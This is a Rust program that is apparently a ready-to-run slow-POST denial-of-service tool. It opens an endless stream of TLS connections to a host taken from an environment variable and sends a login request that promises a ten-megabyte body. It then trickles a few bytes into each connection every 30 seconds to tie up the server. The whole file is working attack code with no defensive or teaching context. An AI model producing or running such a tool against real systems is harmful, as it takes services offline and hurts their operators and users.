extern crate native_tls;
use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::{Duration, Instant};
use std::sync::{Arc, Mutex};

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let batches_count = 4;
    let connections_count = 2048;
    let timeout = 30;

    let mut streams_batches = Vec::with_capacity(batches_count);
    for batch_number in 0..batches_count {
        let connections_count = connections_count / batches_count;
        let host = host.to_owned();

        let true_streams = Arc::new(Mutex::new(Vec::with_capacity(connections_count)));
        let streams = true_streams.to_owned();
        streams_batches.push(true_streams);

        let _connections_producer = thread::spawn(move || {
            let now = Instant::now();
            let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\nemail=", host);
            for connection_number in 0.. {
                let connector = TlsConnector::builder().unwrap().build().unwrap();
                let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
                let mut stream = connector.connect(&host, stream).unwrap();
                let _ = stream.write(start.as_bytes());
                let _ = stream.flush();
                streams.lock().unwrap().push(stream);
                println!("Elapsed: {} seconds. Thread: {}. Connection {} has been spawned.", now.elapsed().as_secs(), batch_number, connection_number);
            }
        });
    }

    for (batch_number, true_streams) in streams_batches.iter().enumerate() {
        let streams = true_streams.to_owned();
        let now = Instant::now();
        let _feeder = thread::spawn(move || {
            loop {
                thread::sleep(Duration::from_secs(timeout));
                let mut locked = streams.lock().unwrap();
                let streams_count = locked.len();
                for (_index, stream) in locked.iter_mut().enumerate() {
                    let _ = stream.write(b"a=b&");
                    let _ = stream.flush();
                }
                println!("Elapsed: {} seconds. Thread: {}. Done feeding {} streams.", now.elapsed().as_secs(), batch_number, streams_count);
            }
        });
    }

    loop {}
}